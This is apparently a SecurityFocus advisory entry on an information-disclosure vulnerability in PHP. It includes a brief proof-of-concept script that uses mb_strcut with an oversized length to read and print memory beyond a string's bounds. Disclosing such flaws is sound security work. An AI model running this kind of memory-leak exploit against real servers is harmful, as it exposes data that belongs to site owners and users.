source:  http://www.securityfocus.com/bid/44727/info

PHP is prone to an information-disclosure vulnerability.

Attackers can exploit this issue to obtain sensitive information that may lead to further attacks. 

<?php
$b = "bbbbbbbbbbb";
str_repeat("THIS IS A SECRET MESSAGE, ISN'T IT?", 1);
$var3 = mb_strcut($b, 0, 1000);
echo $var3;
?> 